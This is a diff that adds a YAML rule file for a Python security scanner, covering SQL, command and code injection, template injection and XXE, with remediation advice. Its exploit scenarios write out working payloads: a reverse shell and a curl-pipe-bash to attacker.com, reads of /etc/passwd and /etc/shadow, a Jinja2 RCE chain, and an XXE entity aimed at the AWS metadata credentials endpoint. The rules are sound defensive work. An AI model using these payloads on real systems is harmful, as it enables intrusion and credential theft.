@@ -1,0 +1,2174 @@
+rules:
+- rule_id: PY-INJ-001
+  title: SQL Injection via String Formatting
+  description: 'Detects SQL query construction using Python f-strings, .format(), or % string formatting with user-controlled
+    input.
+
+    '
+  language: python
+  category: injection
+  severity: Critical
+  confidence: 0.93
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - sql-injection
+  - f-string
+  - string-format
+  patterns:
+  - type: regex
+    pattern: (?:cursor|conn|connection|db|engine|session)\.(?:execute|executemany|raw)\s*\(\s*f['"](?:SELECT|INSERT|UPDATE|DELETE|DROP|TRUNCATE)\b
+  - type: regex
+    pattern: (?:cursor|conn|connection|db)\.execute\s*\(\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*["']\s*%\s*(?:\(|[a-z_])
+  - type: regex
+    pattern: (?:cursor|conn|connection|db)\.execute\s*\(\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*\{\w*\}[^'"]*["']\.format\s*\(
+  - type: regex
+    pattern: text\s*\(\s*f['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*\{[^}]*(?:request|param|input|user|arg|data)\b
+  - type: regex
+    pattern: \.(?:execute|raw)\s*\(\s*f['"][^'"]{0,200}\bWHERE\b[^'"]{0,200}\{(?:request\.|param|input|user|arg|data)\b
+  - type: regex
+    pattern: \.(?:execute|raw)\s*\(\s*['"][^'"]{0,200}\bWHERE\b[^'"]{0,200}["']\s*\+\s*(?:request\.|param|input|user|arg|data)\b
+    description: Detects SQL injection via string concatenation with + operator in WHERE clauses
+  - type: regex
+    pattern: (?:RawSQL|extra)\s*\(\s*f['"](?:SELECT|INSERT|UPDATE|DELETE|WHERE)\b[^'"]*\{[^}]*(?:request|param|input|user|arg|data)\b
+    description: Detects Django RawSQL or extra() with f-string user input
+  - type: regex
+    pattern: pd\.read_sql(?:_query|_table)?\s*\(\s*f['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*\{[^}]*(?:request|param|input|user|arg|data)\b
+    description: Detects pandas read_sql with f-string interpolation of user input
+  anti_patterns:
+  - execute(.*,.*(
+  - execute(.*,.*[
+  - '%(s)s'
+  - :param
+  - bindparam
+  - text(.*).bindparams
+  - sanitize
+  - User.objects.filter(
+  - User.objects.get(
+  - User.objects.exclude(
+  - .objects.values(
+  - session.query(
+  - db.session.query(
+  - select([
+  - Table.select()
+  - Column(
+  - sqlalchemy.orm.Query
+  - flask_sqlalchemy
+  - cursor.execute(query, params)
+  - cursor.execute(sql, values)
+  - asyncpg.connect
+  - prepared_statement
+  impact: 'Full SQL injection enabling data exfiltration, authentication bypass,
+
+    data manipulation, and potential remote code execution through database
+
+    features like INTO OUTFILE or xp_cmdshell.
+
+    '
+  remediation: "Use parameterized queries exclusively:\n\nDjango ORM (preferred):\n  User.objects.filter(username=user_input)\n\
+    \  User.objects.raw(\"SELECT * FROM auth_user WHERE id = %s\", [user_id])\n\nDjango QuerySet.extra() - avoid, use annotations\
+    \ instead:\n  MyModel.objects.annotate(val=Value(user_input)).filter(...)\n\nSQLAlchemy Core:\n  stmt = text(\"SELECT\
+    \ * FROM users WHERE id = :id\")\n  result = connection.execute(stmt, {\"id\": user_id})\n\nSQLAlchemy ORM:\n  session.query(User).filter(User.id\
+    \ == user_id).first()\n\nFlask-SQLAlchemy:\n  User.query.filter_by(username=user_input).first()\n\nFastAPI with async\
+    \ databases:\n  query = users.select().where(users.c.id == user_id)\n  await database.fetch_one(query)\n\npsycopg2:\n\
+    \  cursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))\n\nasyncpg:\n  await conn.fetchrow(\"SELECT * FROM\
+    \ users WHERE id = $1\", user_id)\n\nNever use f-strings, .format(), or % formatting in SQL statements.\nUse an ORM whenever\
+    \ possible. If raw SQL is required, always use\nparameterized placeholders native to the database driver.\n"
+  references:
+  - https://owasp.org/Top10/A03_2021-Injection/
+  - https://cwe.mitre.org/data/definitions/89.html
+  context_awareness:
+    surrounding_context_patterns:
+    - import sqlite3
+    - import psycopg2
+    - import pymysql
+    - import mysql.connector
+    - from sqlalchemy import
+    - from django.db import connection
+    - import asyncpg
+    - import aiomysql
+    - import pandas as pd
+    taint_source_indicators:
+    - request.GET
+    - request.POST
+    - request.args
+    - request.form
+    - request.json
+    - request.data
+    - request.query_params
+    - request.body
+    - request.params
+    - sys.argv
+    - input()
+    - os.environ
+    taint_sink_indicators:
+    - cursor.execute(
+    - connection.execute(
+    - session.execute(
+    - engine.execute(
+    - db.execute(
+    - pd.read_sql(
+    - .raw(
+    - RawSQL(
+    - .extra(where=
+    sanitization_patterns:
+    - parameterized query with %s placeholder
+    - parameterized query with :named placeholder
+    - parameterized query with ? placeholder
+    - bleach.clean(
+    - escape_string(
+    - quote_identifier(
+    - django.utils.encoding.force_str(
+    - int(user_input)
+    - uuid.UUID(user_input)
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Django web application has a search endpoint that builds SQL queries using
+
+      f-strings. The developer constructs: cursor.execute(f"SELECT * FROM products
+
+      WHERE name LIKE ''%{request.GET[''q'']}%''"). An attacker submits the search query:
+
+      '' UNION SELECT username, password, email, credit_card FROM users --
+
+      This appended payload closes the original LIKE clause, performs a UNION-based
+
+      injection to exfiltrate the entire users table including credentials and payment
+
+      data, and comments out the trailing SQL. The attacker can further escalate by
+
+      writing a webshell via SELECT ... INTO OUTFILE on MySQL or using COPY on
+
+      PostgreSQL to read arbitrary server files.
+
+      '
+    example_payload: ''' UNION SELECT username, password, email, null FROM auth_user --'
+    attacker_objective: Exfiltrate sensitive data from the database including user credentials, personal information, and
+      payment details. Potentially escalate to remote code execution through database-native file operations.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PY-INJ-003
+    - PY-INJ-004
+    - PY-AUTH-001
+  detection_layer: 1
+- rule_id: PY-INJ-002
+  title: Command Injection via os.system or subprocess with shell=True
+  description: 'Detects use of os.system(), os.popen(), or subprocess with shell=True accepting user-controlled input.
+
+    '
+  language: python
+  category: injection
+  severity: Critical
+  confidence: 0.94
+  cwe: CWE-78
+  owasp: A03:2021-Injection
+  tags:
+  - command-injection
+  - os-command
+  - subprocess
+  - rce
+  patterns:
+  - type: regex
+    pattern: os\.(?:system|popen|popen2|popen3|popen4)\s*\(\s*f['"][^'"]*\{[^}]*(?:request|param|input|user|arg|data)\b
+  - type: regex
+    pattern: os\.(?:system|popen)\s*\(\s*['"][^'"]*["']\s*(?:\+|%)\s*(?:request|param|input|user|arg|data)
+  - type: regex
+    pattern: subprocess\.(?:call|run|Popen|check_output|check_call|getoutput|getstatusoutput)\s*\([^)]*shell\s*=\s*True[^)]*(?:request|param|input|user|arg|data)
+  - type: regex
+    pattern: subprocess\.(?:call|run|Popen)\s*\(\s*f['"][^'"]*\{[^}]*(?:request|param|input|user)\b[^)]*shell\s*=\s*True
+  - type: regex
+    pattern: os\.(?:system|popen)\s*\(\s*(?:request\.|param|input|user|cmd|command)\b
+  - type: regex
+    pattern: os\.(?:execl|execle|execlp|execlpe|execv|execve|execvp|execvpe)\s*\([^)]*(?:request|param|input|user|data)\b
+    description: Detects os.exec* family functions with user-controlled arguments
+  - type: regex
+    pattern: commands\.(?:getoutput|getstatusoutput)\s*\([^)]*(?:request|param|input|user|data)\b
+    description: Detects deprecated commands module with user input
+  - type: regex
+    pattern: asyncio\.create_subprocess_shell\s*\([^)]*(?:request|param|input|user|data)\b
+    description: Detects asyncio shell subprocess with user-controlled input
+  anti_patterns:
+  - shlex.quote
+  - shlex.split
+  - shell=False
+  - pipes.quote
+  - '# nosec'
+  - subprocess.run([
+  - subprocess.call([
+  - subprocess.Popen([
+  - subprocess.check_output([
+  - subprocess.check_call([
+  - ALLOWED_COMMANDS
+  - COMMAND_WHITELIST
+  - COMMAND_ALLOWLIST
+  - if command not in
+  - if cmd in allowed
+  - pathlib.Path(
+  - shutil.copy(
+  - shutil.move(
+  - os.path.join(
+  impact: 'Remote code execution. Attacker can execute arbitrary system commands on the
+
+    server, potentially gaining full control, accessing sensitive files, or
+
+    pivoting to internal systems.
+
+    '
+  remediation: "General best practices:\n  - Use subprocess.run() with shell=False (default) and pass args as a list\n  -\
+    \ Use shlex.split() for safe argument parsing\n  - Use shlex.quote() for individual argument escaping if shell is needed\n\
+    \  - Prefer Python libraries (shutil, pathlib) over shell commands\n  - Apply strict input validation with allowlists\n\
+    \nDjango:\n  - Use django.core.management.call_command() for management commands\n  - Use pathlib or shutil for file operations\
+    \ instead of shell commands\n  - Validate input against a strict allowlist before any subprocess usage\n\nFlask:\n  -\
+    \ Use secure_filename() from werkzeug.utils for filename handling\n  - Avoid passing Flask request data to any subprocess\
+    \ or os.system call\n  - Implement a command builder pattern with strict allowlists\n\nFastAPI:\n  - Use Pydantic models\
+    \ to validate and constrain input before system calls\n  - Use asyncio.create_subprocess_exec (NOT _shell) with list arguments\n\
+    \  - Implement typed enums for any command-selection logic\n\nSecure library recommendations:\n  - shlex: For safe shell\
+    \ argument handling\n  - pathlib: For filesystem operations instead of shell commands\n  - shutil: For file copy/move/delete\
+    \ instead of shell commands\n  - plumbum: For type-safe subprocess management\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://docs.python.org/3/library/subprocess.html#security-considerations
+  context_awareness:
+    surrounding_context_patterns:
+    - import os
+    - import subprocess
+    - import commands
+    - import asyncio
+    - from os import system
+    - from subprocess import
+    - import shlex
+    - import shutil
+    taint_source_indicators:
+    - request.GET
+    - request.POST
+    - request.args
+    - request.form
+    - request.json
+    - request.data
+    - request.query_params
+    - sys.argv
+    - input()
+    - os.environ
+    - request.files
+    - request.headers
+    taint_sink_indicators:
+    - os.system(
+    - os.popen(
+    - subprocess.call(
+    - subprocess.run(
+    - subprocess.Popen(
+    - subprocess.check_output(
+    - subprocess.check_call(
+    - os.execv(
+    - os.execvp(
+    - asyncio.create_subprocess_shell(
+    sanitization_patterns:
+    - shlex.quote(
+    - shlex.split(
+    - pipes.quote(
+    - re.match(r'^[a-zA-Z0-9_]+$'
+    - if command in ALLOWED_COMMANDS
+    - if cmd in whitelist
+    - subprocess.run([cmd_path], ...
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * shell_flag_weight
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Flask application provides a network diagnostic tool that lets users ping a
+
+      host. The endpoint handler contains: os.system(f"ping -c 4 {request.form[''host'']}").
+
+      An attacker submits the host value: 8.8.8.8; cat /etc/passwd
+
+      The semicolon terminates the ping command and the shell executes cat /etc/passwd,
+
+      disclosing the system user list. The attacker then escalates by injecting:
+
+      8.8.8.8; curl http://attacker.com/shell.sh | bash
+
+      This downloads and executes a reverse shell script, granting the attacker
+
+      persistent interactive access to the server. From there, the attacker can
+
+      exfiltrate secrets, install a cryptominer, or pivot into the internal network.
+
+      '
+    example_payload: 8.8.8.8; cat /etc/passwd && curl http://attacker.com/rev.sh | bash
+    attacker_objective: Achieve remote code execution on the application server. Execute arbitrary commands to exfiltrate
+      data, install backdoors, or pivot to internal network resources.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PY-INJ-003
+    - PY-INJ-001
+    - PY-SEC-002
+  detection_layer: 1
+- rule_id: PY-INJ-003
+  title: Code Injection via eval/exec with User Input
+  description: 'Detects use of eval(), exec(), or compile() with user-controlled input, enabling arbitrary Python code execution.
+
+    '
+  language: python
+  category: injection
+  severity: Critical
+  confidence: 0.96
+  cwe: CWE-94
+  owasp: A03:2021-Injection
+  tags:
+  - code-injection
+  - eval
+  - exec
+  - rce
+  patterns:
+  - type: regex
+    pattern: \beval\s*\(\s*(?:request\.|param|input|user|data|arg|form|body)\b
+  - type: regex
+    pattern: \bexec\s*\(\s*(?:request\.|param|input|user|data|arg|form|body)\b
+  - type: regex
+    pattern: \bcompile\s*\(\s*(?:request\.|param|input|user|data|arg|form|body)\b
+  - type: regex
+    pattern: \beval\s*\(\s*f['"][^'"]*\{[^}]*(?:request|param|input|user|data)\b
+  - type: regex
+    pattern: \b(?:eval|exec)\s*\(\s*['"][^'"]*["']\s*(?:\+|%)\s*(?:request|param|input|user|data)
+  - type: regex
+    pattern: \b__import__\s*\(\s*(?:request\.|param|input|user|data|arg|form|body)\b
+    description: Detects dynamic import with user-controlled module name
+  - type: regex
+    pattern: \bgetattr\s*\(\s*\w+\s*,\s*(?:request\.|param|input|user|data|arg|form)\b
+    description: Detects getattr with user-controlled attribute name for attribute injection
+  - type: regex
+    pattern: \bglobals\s*\(\s*\)\s*\[\s*(?:request\.|param|input|user|data|arg|form)\b
+    description: Detects globals() access with user-controlled key
+  anti_patterns:
+  - ast.literal_eval
+  - json.loads
+  - '# safe'
+  - literal_eval
+  - RestrictedPython
+  - simpleeval
+  - numexpr.evaluate
+  - safe_eval
+  - ALLOWED_FUNCTIONS
+  - SAFE_BUILTINS
+  - compile(source, '<string>', 'eval')
+  - json.dumps
+  - yaml.safe_load
+  - int(
+  - float(
+  - isinstance(user_input, (int, float))
+  - math_parser
+  - pyparsing
+  impact: 'Arbitrary Python code execution in the application context. Attackers can
+
+    import modules, access the file system, read environment variables, establish
+
+    reverse shells, or pivot laterally.
+
+    '
+  remediation: "General:\n  - Never use eval()/exec() with user input under any circumstances\n  - Use ast.literal_eval()\
+    \ for safe literal evaluation of strings, numbers, tuples, lists, dicts, booleans, and None\n  - Use json.loads() for\
+    \ JSON parsing\n  - Implement a safe expression parser (e.g., pyparsing, simpleeval) for math expressions\n\nDjango:\n\
+    \  - Use Django template language for dynamic rendering instead of eval\n  - Use Django forms and model validation for\
+    \ input processing\n  - For dynamic filtering, use Q objects: Q(**{field: value})\n  - Never pass user input to eval for\
+    \ dynamic queryset construction\n\nFlask:\n  - Use Flask-WTF forms for input validation\n  - For calculator-type features,\
+    \ use simpleeval or numexpr libraries\n  - Use Jinja2 filters and template logic instead of eval for dynamic output\n\n\
+    FastAPI:\n  - Use Pydantic validators to parse and constrain input types\n  - For dynamic computation, define allowed\
+    \ operations as a mapping of string keys to functions\n  - Use dependency injection to safely resolve dynamic behavior\n\
+    \nIf code execution is truly required:\n  - Use RestrictedPython with a minimal set of allowed builtins\n  - Run user\
+    \ code in a sandboxed container (Docker, gVisor)\n  - Use WebAssembly-based sandboxes (Pyodide) for client-side execution\n\
+    \  - Enforce execution time limits and memory constraints\n\nSecure library recommendations:\n  - ast.literal_eval: For\
+    \ safely evaluating literal Python expressions\n  - simpleeval: For safe mathematical expression evaluation\n  - numexpr:\
+    \ For safe numerical expression evaluation\n  - RestrictedPython: For sandboxed Python execution\n  - pyparsing: For building\
+    \ safe custom parsers\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/94.html
+  - https://owasp.org/Top10/A03_2021-Injection/
+  context_awareness:
+    surrounding_context_patterns:
+    - import ast
+    - import json
+    - import pickle
+    - import marshal
+    - from RestrictedPython import
+    - import builtins
+    - import importlib
+    - __builtins__
+    taint_source_indicators:
+    - request.GET
+    - request.POST
+    - request.args
+    - request.form
+    - request.json
+    - request.data
+    - request.query_params
+    - request.body
+    - sys.argv
+    - input()
+    - os.environ
+    - websocket.receive()
+    taint_sink_indicators:
+    - eval(
+    - exec(
+    - compile(
+    - __import__(
+    - getattr(
+    - globals()[
+    - locals()[
+    - setattr(
+    - importlib.import_module(
+    sanitization_patterns:
+    - ast.literal_eval(
+    - json.loads(
+    - int(
+    - float(
+    - bool(
+    - isinstance(input_val, allowed_types)
+    - re.fullmatch(r'^[0-9+\-*/() ]+$'
+    - simpleeval.simple_eval(
+    - numexpr.evaluate(
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * direct_eval_weight
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Flask web application provides a calculator feature that evaluates user
+
+      expressions using eval(). The endpoint handler contains:
+
+      result = eval(request.form[''expression'']). An attacker submits the expression:
+
+      __import__(''os'').system(''id && cat /etc/shadow'')
+
+      This imports the os module and executes system commands, disclosing system user
+
+      credentials. The attacker then escalates by sending:
+
+      __import__(''os'').system(''python3 -c "import socket,subprocess;s=socket.socket();s.connect((\"attacker.com\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"'')
+
+      This establishes a reverse shell to the attacker''s server with full interactive
+
+      access. The attacker can then read Django settings containing SECRET_KEY and
+
+      database credentials, dump the database, or install persistent backdoors.
+
+      '
+    example_payload: __import__('os').popen('cat /etc/passwd').read()
+    attacker_objective: Execute arbitrary Python code in the application's runtime context. Import system modules to read
+      files, access environment secrets, establish reverse shells, and gain persistent server access.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: simple
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PY-INJ-001
+    - PY-INJ-002
+    - PY-INJ-004
+  detection_layer: 1
+- rule_id: PY-INJ-004
+  title: Server-Side Template Injection (SSTI)
+  description: 'Detects Jinja2, Mako, or Django template rendering with user-controlled template strings, enabling server-side
+    template injection.
+
+    '
+  language: python
+  category: injection
+  severity: High
+  confidence: 0.9
+  cwe: CWE-1336
+  owasp: A03:2021-Injection
+  tags:
+  - ssti
+  - template-injection
+  - jinja2
+  - rce
+  patterns:
+  - type: regex
+    pattern: (?:Template|Environment)\s*\([^)]*\)\.(?:render|from_string)\s*\(\s*(?:request\.|param|input|user|data)
+  - type: regex
+    pattern: render_template_string\s*\(\s*(?:request\.|param|input|user|data|arg|form)
+  - type: regex
+    pattern: Template\s*\(\s*(?:request\.|param|input|user|data|arg|form)\b
+  - type: regex
+    pattern: from_string\s*\(\s*(?:request\.|param|input|user|data|f['"])
+  - type: regex
+    pattern: Jinja2Templates[^)]*\)\.TemplateResponse\s*\([^)]*(?:request\.query|request\.body|request\.form)
+  - type: regex
+    pattern: MakoTemplate\s*\(\s*(?:request\.|param|input|user|data|arg|form)\b
+    description: Detects Mako template engine with user-controlled template string
+  - type: regex
+    pattern: render_template_string\s*\(\s*f['"][^'"]*\{[^}]*(?:request|param|input|user|data)\b
+    description: Detects render_template_string with f-string interpolation of user input
+  - type: regex
+    pattern: django\.template\.Template\s*\(\s*(?:request\.|param|input|user|data|arg|form)\b
+    description: Detects Django Template class instantiated with user-controlled string
+  anti_patterns:
+  - render_template(
+  - autoescape=True
+  - SandboxedEnvironment
+  - escape(
+  - Markup(
+  - render_to_string(
+  - loader.get_template(
+  - get_template(
+  - template_name
+  - TemplateView
+  - render(request, 'template.html'
+  - Jinja2Templates(directory=
+  - Environment(loader=FileSystemLoader
+  - Environment(loader=PackageLoader
+  - bleach.clean(
+  - markupsafe.escape(
+  - django.utils.html.escape(
+  - strip_tags(
+  impact: 'Server-side template injection allows attackers to execute arbitrary code
+
+    within the template engine context. In Jinja2, this can lead to full RCE
+
+    via __class__.__mro__ traversal or os module access.
+
+    '
+  remediation: "General:\n  - Use render_template() with file-based templates, never render_template_string()\n  - If dynamic\
+    \ templates are needed, use Jinja2 SandboxedEnvironment\n  - Enable autoescape=True\n  - Never pass user input as a template\
+    \ string\n  - Validate and sanitize all dynamic template content\n\nDjango:\n  - Always use file-based templates with\
+    \ render(request, 'template.html', context)\n  - Use Django's built-in template engine with autoescape enabled (default)\n\
+    \  - Never instantiate django.template.Template() with user input\n  - Use the mark_safe() function only on trusted content,\
+    \ never on user input\n  - Use django.utils.html.escape() for any user content rendered in templates\n\nFlask:\n  - Use\
+    \ render_template('template.html', **context) with file-based templates\n  - Never use render_template_string() with user-controlled\
+    \ content\n  - Enable Jinja2 autoescape (enabled by default for .html templates)\n  - Use markupsafe.escape() for user\
+    \ input that must be rendered\n  - If dynamic templates are required, use jinja2.sandbox.SandboxedEnvironment\n\nFastAPI:\n\
+    \  - Use Jinja2Templates(directory=\"templates\") with file-based templates\n  - Pass user data only as template context\
+    \ variables, never as template source\n  - Enable autoescape=True in the Jinja2 environment configuration\n  - Use Pydantic\
+    \ validation on all user inputs before passing to templates\n\nMako:\n  - Use file-based templates with TemplateLookup\n\
+    \  - Enable strict_undefined=True and default_filters=['h']\n  - Never pass user input to mako.template.Template() constructor\n\
+    \nSecure library recommendations:\n  - jinja2.sandbox.SandboxedEnvironment: For restricted Jinja2 execution\n  - markupsafe:\
+    \ For safe HTML string handling\n  - bleach: For HTML sanitization\n"
+  references:
+  - https://portswigger.net/research/server-side-template-injection
+  - https://cwe.mitre.org/data/definitions/1336.html
+  context_awareness:
+    surrounding_context_patterns:
+    - from jinja2 import
+    - from flask import render_template_string
+    - from mako.template import Template
+    - from django.template import Template
+    - import jinja2
+    - from django.template import engines
+    - from starlette.templating import
+    - from fastapi.templating import
+    taint_source_indicators:
+    - request.GET
+    - request.POST
+    - request.args
+    - request.form
+    - request.json
+    - request.data
+    - request.query_params
+    - request.body
+    - request.values
+    - request.cookies
+    - websocket.receive()
+    taint_sink_indicators:
+    - render_template_string(
+    - Template(
+    - from_string(
+    - Environment().from_string(
+    - MakoTemplate(
+    - django.template.Template(
+    - Template(source=
+    sanitization_patterns:
+    - SandboxedEnvironment(
+    - escape(
+    - markupsafe.escape(
+    - bleach.clean(
+    - django.utils.html.escape(
+    - strip_tags(
+    - autoescape=True
+    - Markup.escape(
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * template_engine_risk_weight
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Flask application has a greeting endpoint that renders a personalized message
+
+      using render_template_string(). The handler contains:
+
+      return render_template_string(f"Hello {request.args.get(''name'')}!")
+
+      An attacker probes for SSTI by submitting name={{7*7}} and observes "Hello 49!"
+
+      in the response, confirming template injection. The attacker then escalates
+
+      with the payload:
+
+      {{''''.__class__.__mro__[1].__subclasses__()[407](''cat /etc/passwd'',shell=True,stdout=-1).communicate()[0]}}
+
+      This traverses the Python MRO chain to find the subprocess.Popen class, executes
+
+      an arbitrary system command, and returns the output in the HTTP response. The
+
+      attacker can read application source, extract SECRET_KEY, forge session cookies
+
+      to impersonate any user, or establish a reverse shell for persistent access.
+
+      '
+    example_payload: '{{config.__class__.__init__.__globals__[''os''].popen(''id'').read()}}'
+    attacker_objective: Achieve remote code execution through the template engine. Traverse Python's class hierarchy to access
+      system modules, execute commands, read application secrets, and gain persistent server access.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: medium
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PY-INJ-003
+    - PY-INJ-001
+    - PY-XSS-001
+  detection_layer: 1
+- rule_id: PY-INJ-005
+  title: XML External Entity (XXE) Injection
+  description: 'Detects XML parsing with external entity processing enabled, allowing XXE attacks for file disclosure and
+    SSRF.
+
+    '
+  language: python
+  category: injection
+  severity: High
+  confidence: 0.91
+  cwe: CWE-611
+  owasp: A05:2021-Security-Misconfiguration
+  tags:
+  - xxe
+  - xml-injection
+  - file-disclosure
+  - ssrf
+  patterns:
+  - type: regex
+    pattern: xml\.etree\.ElementTree\.(?:parse|fromstring|iterparse)\s*\(
+  - type: regex
+    pattern: lxml\.etree\.(?:parse|fromstring|XML|iterparse)\s*\([^)]*(?:resolve_entities|no_network)\s*=\s*(?:True|1)
+  - type: regex
+    pattern: xml\.sax\.(?:parse|parseString|make_parser)\s*\(
+  - type: regex
+    pattern: xml\.dom\.(?:minidom|pulldom)\.(?:parse|parseString)\s*\(
+  - type: regex
+    pattern: XMLParser\s*\(\s*(?!.*resolve_entities\s*=\s*False)
+  - type: regex
+    pattern: xml\.parsers\.expat\.ParserCreate\s*\(
+    description: Detects expat XML parser which may be vulnerable to XXE
+  - type: regex
+    pattern: xmlrpc\.(?:client|server)\.(?:ServerProxy|SimpleXMLRPCServer)\s*\(
+    description: Detects XML-RPC usage which processes XML and may be vulnerable
+  - type: regex
+    pattern: lxml\.etree\.(?:parse|fromstring|XML)\s*\(\s*(?:request\.|param|input|user|data|arg|form|body)\b
+    description: Detects lxml parsing user-controlled XML data directly
+  anti_patterns:
+  - defusedxml
+  - resolve_entities=False
+  - XMLParser(resolve_entities=False)
+  - no_network=True
+  - forbid_dtd
+  - forbid_entities
+  - forbid_external
+  - defusedxml.ElementTree
+  - defusedxml.minidom
+  - defusedxml.sax
+  - defusedxml.lxml
+  - defusedxml.xmlrpc
+  - from defusedxml import
+  - import defusedxml
+  - parser.setFeature(handler.feature_external_ges, False)
+  - parser.setFeature(handler.feature_external_pes, False)
+  - XMLParser(resolve_entities=False, no_network=True)
+  - json.loads(
+  - json.load(
+  impact: 'XXE attacks enable local file disclosure (/etc/passwd, application configs),
+
+    server-side request forgery to internal services, denial of service via
+
+    billion laughs attack, and port scanning of internal networks.
+
+    '
+  remediation: "General:\n  - Use defusedxml library as a drop-in replacement for standard XML parsers\n  - For lxml: XMLParser(resolve_entities=False,\
+    \ no_network=True)\n  - Disable DTD processing entirely\n  - Use JSON instead of XML where possible\n  - If XML is required,\
+    \ validate against a strict schema\n\nDjango:\n  - Use Django REST Framework with JSONParser instead of XMLParser\n  -\
+    \ If XML is needed, use defusedxml in custom parsers:\n      from defusedxml.ElementTree import parse\n  - Remove XMLParser\
+    \ from REST_FRAMEWORK parser_classes\n  - Configure Django REST Framework:\n      REST_FRAMEWORK = {\n          'DEFAULT_PARSER_CLASSES':\
+    \ [\n              'rest_framework.parsers.JSONParser',\n          ]\n      }\n\nFlask:\n  - Use request.get_json() instead\
+    \ of parsing XML from request.data\n  - If XML endpoints are required, use defusedxml:\n      from defusedxml.ElementTree\
+    \ import fromstring\n      data = fromstring(request.data)\n  - Consider Flask-RESTX with JSON-only endpoints\n\nFastAPI:\n\
+    \  - Accept JSON via Pydantic models instead of raw XML\n  - If XML processing is required, create a custom dependency:\n\
+    \      from defusedxml.ElementTree import fromstring\n      async def parse_xml(request: Request):\n          return fromstring(await\
+    \ request.body())\n  - Avoid using python-multipart or other parsers that process XML\n\nlxml-specific hardening:\n  -\
+    \ parser = lxml.etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)\n  - tree\
+    \ = lxml.etree.parse(source, parser=parser)\n\nSecure library recommendations:\n  - defusedxml: Drop-in secure replacement\
+    \ for all stdlib XML parsers\n  - lxml (hardened): With resolve_entities=False, no_network=True\n  - xmltodict: For simple\
+    \ XML-to-dict conversion (use with defusedxml.expat)\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/611.html
+  - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
+  context_awareness:
+    surrounding_context_patterns:
+    - import xml.etree.ElementTree
+    - from xml.etree import ElementTree
+    - import lxml.etree
+    - from lxml import etree
+    - import xml.sax
+    - import xml.dom.minidom
+    - import xml.dom.pulldom
+    - import xml.parsers.expat
+    - import xmlrpc
+    - from xml.parsers.expat import
+    taint_source_indicators:
+    - request.data
+    - request.body
+    - request.files
+    - request.stream
+    - request.get_data()
+    - request.content
+    - uploaded_file.read()
+    - open(filename).read()
+    - sys.stdin.read()
+    - socket.recv(
+    taint_sink_indicators:
+    - ElementTree.parse(
+    - ElementTree.fromstring(
+    - etree.parse(
+    - etree.fromstring(
+    - etree.XML(
+    - sax.parse(
+    - sax.parseString(
+    - minidom.parse(
+    - minidom.parseString(
+    - pulldom.parse(
+    - pulldom.parseString(
+    - expat.ParserCreate(
+    - XMLParser(
+    sanitization_patterns:
+    - defusedxml.
+    - resolve_entities=False
+    - no_network=True
+    - forbid_dtd=True
+    - forbid_entities=True
+    - forbid_external=True
+    - parser.setFeature(handler.feature_external_ges, False)
+    - parser.setFeature(handler.feature_external_pes, False)
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * external_entity_exposure_weight
+    exploitability_score: Medium
+  exploit_scenario:
+    attack_example: 'A Django REST Framework application accepts XML-formatted API requests for
+
+      data import. The endpoint parses the uploaded XML using:
+
+      tree = ElementTree.fromstring(request.body)
+
+      An attacker crafts a malicious XML document with an external entity definition:
+
+      <?xml version="1.0"?>
+
+      <!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
+      <data><user>&xxe;</user></data>
+
+      The XML parser resolves the external entity, reading /etc/passwd and embedding
+
+      its contents into the parsed data. The attacker then reads the application
+
+      secrets by targeting file:///app/settings.py. Next, the attacker uses SSRF
+
+      via: <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+
+      to steal AWS IAM credentials from the metadata service. With these credentials,
+
+      the attacker can access S3 buckets, RDS databases, or other AWS resources.
+
